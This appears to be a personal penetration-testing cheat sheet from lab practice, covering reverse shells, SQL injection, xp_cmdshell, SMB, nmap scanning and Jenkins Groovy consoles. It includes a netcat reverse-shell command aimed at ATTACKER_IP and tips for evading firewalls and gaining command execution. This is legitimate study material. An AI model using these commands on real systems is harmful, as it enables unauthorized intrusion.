# general
- when there are only 5 password attempts or so, we try the top 5 for common user names (admin)
## reverse shell
- if the target machine doesn't have `netcat` or access to the internet, you can run `python3 -m http.server 80` on the attacker machine to server binary files
- running `nc -e cmd.exe ATTACKER_IP PORT` on the target will send shell I/O to the attacker listening on `PORT`
# sql 
## injection
- some sql injections can actually log you in if they are creating a session based on the results of a query and input fields are added to the query via template strings
## t-sql
- `sp_configure` allows you to change global settings for the sql server. `reconfigure` needs to be ran to apply the changes
- `xp_cmdshell` spawns a Windows command shell and returns command output as rows
## smb
- smb will mount a drive to your machine to perform file operations on
- `$` represents a hidden share and typical remote clients will not present it. every administrative share is hidden, but anyone can create a hidden share. administrative shares are automatically created
- network shares can be accessed via smb in Windows file explorer with `\\[server_name]\`
- on Mac it can be accessed with Finder, Go, "Connect To Server"
## ftp
- ftp allows you to download specific files
- `Administrator` is the default account for Windows Servers
  - this presents a problem for `xfreerdp` which picks the default username as `root`
- you need an X server such as `xquartz` running in order to use something like rdp on a unix based machine
- `telnet` runs on port 23 and is considered a less secure remoting protocol
**dir busting** - enumerating the directories of a website which return web objects
## web
- `gobuster` is a popular dir buster with capabilities to accept wordlists (from say `SecLists`), file extensions
- `-scheme:chrome-extension` should hide all the noise from bitwarden
## `nmap`
- `nmap` can be used to find which services are running on a port
- `nmap -sC` will use a default set of scripts to scan a target
- repeated firewall blocks will raise suspicion, so it's important to bypass them early
  - there is a discovery phase where `nmap` will `ping` for active devices. this is usually blocked by firewalls
  - any information discovered should documented to not overload firewall with repeated commands. enumeration should be tried again however on privilege escaltion
## `node`
- Burp Suite decoder tab is useful to encode query parameters for template injection for example
  - careful writing code inside this tab, you may miss stupid things like closing `"` or other syntax errors
- `require` function appears to be global but it is not
- `process` is global and returns an object which contains a reference to `mainModule`
## `jenkins`
- groovy is an extremely powerful scripting language which has java like syntax
- accessing a groovy console, at the `/script` directory of the web instance, is essentially access to the host machine (reverse shell capabilities)